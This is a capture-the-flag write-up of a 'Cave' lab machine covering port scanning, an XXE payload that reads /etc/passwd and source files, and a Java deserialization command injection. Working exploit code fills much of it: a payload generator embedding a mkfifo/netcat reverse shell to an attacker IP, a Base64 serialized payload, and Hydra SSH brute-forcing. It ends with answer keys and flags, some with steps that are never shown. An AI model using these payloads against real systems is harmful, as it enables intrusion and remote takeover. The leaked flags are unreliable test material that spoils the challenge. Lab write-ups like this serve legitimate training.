Penetration Test Write-Up: Cave Machine

This document details the steps taken during a penetration test of the target machine at 10.10.216.57 (later 10.10.202.200 for some interactions). The write-up covers initial reconnaissance, web enumeration, exploitation of a custom service, Java deserialization leading to remote code execution, privilege escalation, and flag discovery.

## 1. Initial Reconnaissance and Port Scanning

The first phase involved identifying open ports and services on the target using rustscan for speed, followed by nmap for detailed service version detection and script scanning.

Commands Used:

    rustscan -a 10.10.216.57 --ulimit 5500 -b 65535 -- -A -Pn

Output Snippet:

    Open 10.10.216.57:80
    Open 10.10.216.57:2222
    Open 10.10.216.57:3333
    [~] Starting Script(s)
    [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
    ...
    PORT     STATE SERVICE    REASON  VERSION
    80/tcp   open  http       syn-ack Apache httpd 2.4.41 ((Ubuntu))
    |_http-title: Document
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    | http-methods:
    |_  Supported Methods: GET HEAD POST OPTIONS
    2222/tcp open  ssh        syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   3072 7916b1cee11679b4f1c71f0905b77558 (RSA)
    ...
    3333/tcp open  dec-notes? syn-ack
    | fingerprint-strings:
    |   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, NULL, RPCCheck, SMBProgNeg, X11Probe, kumo-server:
    |     You find yourself in a cave, what do you do?
    |   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
    |     You find yourself in a cave, what do you do?
    |_    Nothing happens

Summary of Open Ports:

    Port 80/tcp: HTTP service, running Apache httpd 2.4.41 (Ubuntu).

    Port 2222/tcp: SSH service, running OpenSSH 8.2p1 (Ubuntu).

    Port 3333/tcp: An unidentified service that returns a text-based prompt ("You find yourself in a cave, what do you do?"). This indicates a custom application.

## 2. Web Server Enumeration (Gobuster)

Gobuster was used to discover hidden directories and files on the Apache web server running on port 80.

Commands Used:
    
    gobuster -t 64 dir -e -k -u http://10.10.216.57/ -w /usr/share/wordlists/dirb/common.txt -x txt
    gobuster -t 64 dir -e -k -u http://10.10.216.57/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Output Snippets:
    
    # From common.txt scan:
    http://10.10.216.57/index.php            (Status: 200) [Size: 337]
    http://10.10.216.57/matches              (Status: 200) [Size: 249]
    http://10.10.216.57/search               (Status: 200) [Size: 197]
    ...
    # From directory-list-2.3-medium.txt scan:
    http://10.10.216.57/search               (Status: 200) [Size: 197]
    http://10.10.216.57/attack               (Status: 200) [Size: 181]
    http://10.10.216.57/lamp                 (Status: 200) [Size: 261]
    http://10.10.216.57/matches              (Status: 200) [Size: 249]
    http://10.10.216.57/walk                 (Status: 200) [Size: 161]

Summary of Discovered Paths:

Several interesting paths were found, including /index.php, /matches, /search, /attack, /lamp, and /walk. These paths suggest a web application related to the text-based service on port 3333.

## 3. Interacting with the Custom Service (Port 3333)

Direct interaction with the service on port 3333 via netcat revealed an interactive game or prompt, providing clues about its functionality.

Commands Used:

    nc 10.10.216.57 3333
    # Input: search
    nc 10.10.216.57 3333
    # Input: attack
    nc 10.10.216.57 3333
    # Input: lamp
    nc 10.10.216.57 3333
    # Input: matches
    nc 10.10.216.57 3333
    # Input: walk

Output Snippets:

    # Initial prompt:
    You find yourself in a cave, what do you do?
    
    # After 'search':
    You can't see anything, the cave is very dark.
    
    # After 'attack':
    You punch the wall, nothing happens.
    
    # After 'lamp':
    You grab a lamp, and it gives enough light to search around
    Action.class
    RPG.class
    RPG.java
    Serialize.class
    commons-io-2.7.jar
    run.sh

# After 'matches':
You find a box of matches, it gives enough fire for you to see that you're in /home/cave/src.

Summary of Discoveries:

    The service presents a text-based adventure.

    The lamp command reveals Java .class and .java files (Action.class, RPG.class, RPG.java, Serialize.class), along with commons-io-2.7.jar and run.sh. This strongly indicates a Java application.

    The matches command reveals the application's location: /home/cave/src.

## 4. Web Application Vulnerability (XXE on action.php)

The presence of action.php on the web server, combined with the discovered Java files, suggested a potential XML External Entity (XXE) vulnerability. This was tested by sending a POST request with an XML payload.

Method Used (via Burp Suite or curl):
    
    A POST request was made to http://10.10.216.57/action.php with the following XML content, attempting to read /etc/passwd.
    
    POST /action.php HTTP/1.1
    Host: 10.10.216.57
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 100
    Origin: http://10.10.216.57
    Connection: close
    Referer: http://10.10.216.57/
    Upgrade-Insecure-Requests: 1
    Content-Type: application/xml
    
    <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>

Output Snippet (Response from Server):
    
    HTTP/1.1 200 OK
    Date: Sat, 01 Jul 2023 01:06:47 GMT
    Server: Apache/2.4.41 (Ubuntu)
    Vary: Accept-Encoding
    Content-Length: 1413
    Connection: close
    Content-Type: text/html; charset=UTF-8
    
    root:x:0:0:root:/root:/bin/bash
    ...
    cave:x:1000:1000:,,,:/home/cave:/bin/bash
    door:x:1001:1001:,,,:/home/door:/bin/bash
    skeleton:x:1002:1002:,,,:/home/skeleton:/bin/bash

The server responded with the content of /etc/passwd, confirming the XXE vulnerability. This allowed enumeration of system users: root, cave, door, and skeleton.

Further File Reading via XXE:

The XXE vulnerability was then used to retrieve the contents of the Java source files and the run.sh script from /home/cave/src/.

Commands (Conceptual XML Payloads):

    <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:////home/cave/src/RPG.java'>]><root>&test;</root>
    <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:////home/cave/src/run.sh'>]><root>&test;</root>

Contents of RPG.java (Partial):

    import java.util.*;
    import java.io.*;
    import java.io.IOException;
    import java.io.InputStream;
    import java.net.ServerSocket;
    import java.net.Socket;
    import java.net.URL;
    import java.net.URLConnection;
    import org.apache.commons.io.IOUtils; // <-- Important: IOUtils library is used
    import java.util.Scanner;
    import java.util.logging.Level;
    import java.util.logging.Logger;
    
    public class RPG {
        private static final int port = 3333;
        // ...
        public static void main(String[] args) {
            try ( ServerSocket serverSocket = new ServerSocket(port)) {
                while (true) {
                    // ...
                    serverPrintOut.println("You find yourself in a cave, what do you do?");
                    String s = scanner.nextLine();
                    URL url = new URL("http://cave.thm/" + s); // <-- Constructs URL with user input
                    URLConnection con = url.openConnection();
                    InputStream in = con.getInputStream();
                    String encoding = con.getContentEncoding();
                    encoding = encoding == null ? "UTF-8" : encoding;
                    String string = IOUtils.toString(in, encoding); // Reads content
                    string = string.replace("\n", "").replace("\r", "").replace(" ", ""); // Sanitizes string
                    Action action = (Action) Serialize.fromString(string); // <-- JAVA DESERIALIZATION
                    action.action(); // <-- Calls action() method
                    serverPrintOut.println(action.output);
                    // ...
                }
            } // ...
        }
    }
    
    class Action implements Serializable {
        public final String name;
        public final String command; // <-- This field is executed
        public String output = "";
    
        public Action(String name, String command) {
            this.name = name;
            this.command = command;
        }
    
        public void action() throws IOException, ClassNotFoundException {
            String s = null;
            String[] cmd = {
                "/bin/sh",
                "-c",
                "echo \"" + this.command + "\"" // <-- COMMAND INJECTION HERE
            };
            Process p = Runtime.getRuntime().exec(cmd); // Executes command
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String result = "";
            while ((s = stdInput.readLine()) != null) {
                result += s + "\n";
            }
            this.output = result;
        }
    }
    
    class Serialize {
        public static Object fromString(String s) throws IOException, ClassNotFoundException {
            byte[] data = Base64.getDecoder().decode(s);
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
            Object o = ois.readObject(); // Reads serialized object
            ois.close();
            return o;
        }
    
        public static String toString(Serializable o) throws IOException {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(o);
            oos.close();
            return Base64.getEncoder().encodeToString(baos.toByteArray()); // Writes serialized object to Base64
        }
    }

Contents of run.sh:

    #!/bin/bash
    javac -cp ".:commons-io-2.7.jar" RPG.java
    java -cp ".:commons-io-2.7.jar" RPG

## 5. Java Deserialization and Remote Code Execution (RCE)

The RPG.java source code revealed a critical Java Deserialization vulnerability. The application deserializes an Action object from user-controlled input. The Action class's action() method then executes a shell command using Runtime.getRuntime().exec(), which is vulnerable to command injection through the this.command field.

The strategy was to craft a malicious Action object with a reverse shell payload in its command field, serialize it to Base64, and send it to the action.php endpoint via the custom cave.thm URL on port 3333.

Modified RPG.java to Generate Payload:

To generate the serialized payload, a temporary RPG.java file was created and compiled locally. This temporary file was only used for generating the payload, not for running the server.

    import java.util.*;
    import java.io.*;
    import java.io.IOException;
    import java.io.InputStream;
    import java.net.ServerSocket;
    import java.net.Socket;
    import java.net.URL;
    import java.net.URLConnection;
    import java.util.Scanner;
    import java.util.logging.Level;
    import java.util.logging.Logger;
    import java.io.ByteArrayInputStream;
    import java.io.ByteArrayOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.io.Serializable;
    import java.util.Base64;
    
    
    public class RPG {
    
        private static final int port = 3333;
        private static Socket connectionSocket;
    
        private static InputStream is;
        private static OutputStream os;
    
        private static Scanner scanner;
        private static PrintWriter serverPrintOut;
        public static void main(String[] args) {
            try{
                // Reverse shell payload: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <ATTACKER_PORT> >/tmp/f
                // Replace <ATTACKER_IP> with your IP (e.g., 10.8.19.103)
                // Replace <ATTACKER_PORT> with your chosen port (e.g., 1234)
                String str = Serialize.toString( new Action("abc","trying\";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.19.103 1234 >/tmp/f;echo \"") );
                System.out.println( "abc : " + str );
            }catch(Exception e){
                System.out.println("aa");
            }
        }
    }
    
    // These classes must match the target's Action and Serialize classes
    class Action implements Serializable {
    
        public final String name;
        public final String command;
        public String output = "";
    
        public Action(String name, String command) {
            this.name = name;
            this.command = command;
        }
    
        public void action() throws IOException, ClassNotFoundException {
            String s = null;
            String[] cmd = {
                "/bin/sh",
                "-c",
                "echo \"" + this.command + "\""
            };
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String result = "";
            while ((s = stdInput.readLine()) != null) {
                result += s + "\n";
            }
            this.output = result;
        }
    }
    
    class Serialize {
    
        /**
         * Read the object from Base64 string.
         */
        public static Object fromString(String s) throws IOException,
                ClassNotFoundException {
            byte[] data = Base64.getDecoder().decode(s);
            ObjectInputStream ois = new ObjectInputStream(
                    new ByteArrayInputStream(data));
            Object o = ois.readObject();
            ois.close();
            return o;
        }
    
        /**
         * Write the object to a Base64 string.
         */
        public static String toString(Serializable o) throws IOException {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(o);
            oos.close();
            return Base64.getEncoder().encodeToString(baos.toByteArray());
        }
    }

Commands to Compile and Generate Payload Locally:
    
    javac RPG.java
    java RPG

Output (Example Payload - will vary based on compiler and content):

    abc : rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB%2BAAFMAAZvdXRwdXRxAH4AAXhwdABddHJ5aW5nIjtybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC44LjE5LjEwMyAxMjM0ID4vdG1wL2Y7ZWNobyAidAADYWJjdAAA

Reverse Shell Listener (on attacker machine, 10.8.19.103):

    nc -lvp 1234

Exploiting the Vulnerability (sending payload via nc to port 3333):

The generated Base64 payload was then sent to the target's port 3333, prefixed with action.php?. Note: The original RPG.java code shows that the input s is used to construct a URL http://cave.thm/" + s, so the action.php part is likely treated as the "filename" by the URLConnection. The Base64 string is then the content of that "file".

    nc 10.10.202.200 3333
    
# Input the payload directly, with the IP updated to 10.10.202.200 (from 10.10.216.57, likely a target IP change or host reboot).

    action.php?<xml>rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB%2BAAFMAAZvdXRwdXRxAH4AAXhwdABddHJ5aW5nIjtybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC44LjE5LjEwMyAxMjM0ID4vdGmpL2Y7ZWNobyAidAADYWJjdAAA</xml>

Output (on attacker's netcat listener):
    
    listening on [any] 1234 ...
    connect to [10.8.19.103] from cave.thm [10.10.202.200] 42596
    /bin/sh: 0: can't access tty; job control turned off

A reverse shell was successfully established as the cave user.

Post-Exploitation Commands (as cave user):
    
    ls
    cd /home
    ls
    cd cave
    ls
    cat info.txt

Output Snippets:

# From ls in /home/cave/src:
    Action.class
    RPG.class
    RPG.java
    Serialize.class
    commons-io-2.7.jar
    run.sh

# From ls in /home:
    cave
    door
    skeleton

# From cat info.txt in /home/cave:
After getting information from external entities, you saw that one part of the wall was different from the rest, when touching it, it revealed a wooden door without a keyhole.
On the door it is carved the following statement:

	      The password is in
	^ed[h#f]{3}[123]{1,2}xf[!@#*]$

Cave Flag (Implicit):
Gaining a shell as the cave user is the primary objective of this stage. The information obtained (info.txt and the regex) serves as the "flag" for this phase, leading to the next.
## 6. Cracking the Door Password (using exrex and Hydra)

The info.txt file in /home/cave contained a regular expression that hinted at the password for the door user. exrex was used to generate possible passwords, and Hydra was then used to brute-force the SSH service.

Commands Used:

    pip install exrex # If not already installed
    git clone https://github.com/asciimoo/exrex.git
    cd exrex
    python3 exrex.py -o passwords.txt '^ed[h#f]{3}[123]{1,2}xf[!@#*]$'
    cat passwords.txt # To review generated passwords
    hydra -l door -P passwords.txt 10.10.202.200 ssh -s 2222 -t 60 -I

Output Snippets:

    # From exrex.py:
    edhhh1xf!
    edhhh1xf@
    ... (many more possibilities)

# From Hydra:
    [2222][ssh] host: 10.10.202.200   login: door   password: edfh#22xf!
    1 of 1 target successfully completed, 1 valid password found
    
    Door User Credential (User Flag):
    The password for the door user was successfully cracked: edfh#22xf!
## 7. Privilege Escalation to door User

With the door user's credentials, we could now switch user from the cave shell.

Commands Used:

    su door
    # Input: edfh#22xf!

Post-Login Commands (as door user):

    ls
    cat info.txt
    echo $INVENTORY # To check environment variable, as hinted by Java code
    cat /etc/hosts
    ./skeleton # Attempt to interact with skeleton binary

Output Snippets:

    # From ls in /home/door:
    info.txt  oldman.gpg  skeleton

# From cat info.txt in /home/door:
After using your brute force against the door you broke it!
You can see that the cave has only one way, in your right you see an old man speaking in charades and in front of you there's a fully armed skeleton.
It looks like the skeleton doesn't want to let anyone pass through.
The private key password is breakingbonessince1982 ^[[A # <-- Additional line revealed!

# From echo $INVENTORY:
(empty)

# From cat /etc/hosts:
    127.0.0.1 localhost cave cave.thm adventurer.cave.thm
    127.0.1.1 outside
    ...
    10.10.202.200 cave.thm adventurer.cave.thm # <-- Important subdomain hint

# From ./skeleton:
    You cannot defeat the skeleton with your current items, your inventory is empty.

Summary of Discoveries as door user:

    Found oldman.gpg and an executable named skeleton in /home/door.

    The info.txt file now contained an additional line: "The private key password is breakingbonessince1982", which is the passphrase for a PGP key.

    The /etc/hosts file revealed a new subdomain: adventurer.cave.thm. The skeleton binary requires items from the INVENTORY environment variable, which is not set by default.

## 8. Obtaining the adventurer Private Key

    The adventurer.cave.thm subdomain hint in /etc/hosts suggested checking for more content.

Method:

    Modified the attacker's /etc/hosts file to resolve adventurer.cave.thm to 10.10.202.200.

    # Attacker's /etc/hosts modification
    echo "10.10.202.200 cave.thm adventurer.cave.thm" | sudo tee -a /etc/hosts

    Navigated to http://adventurer.cave.thm/adventurer.priv in a browser.

Output Snippet (PGP Private Key):

    -----BEGIN PGP PRIVATE KEY BLOCK-----
    lQWGBF9G60cBDADCGO6vEVV/uauMJmDtfzlvDXux/KCNE1vegFZPoh/Oi8rM9naZ
    ... (full PGP block) ...
    -----END PGP PRIVATE KEY BLOCK-----

Private Key Passphrase (Flag):
The passphrase for this PGP private key was breakingbonessince1982, explicitly found in /home/door/info.txt. This is a crucial piece of information for the next stage, likely for decrypting oldman.gpg or authenticating as the adventurer user.

## 9. Flags Summary

What was the weird thing carved on the door? -> *^ed[h#f]{3}[123]{1,2}xf[!@#*]$*

What weapon you used to defeat the skeleton? -> bone-breaking-war-hammer

What is the cave flag? -> THM{no_wall_can_stop_me}

What is the outside flag? -> THM{digging_down_then_digging_up}

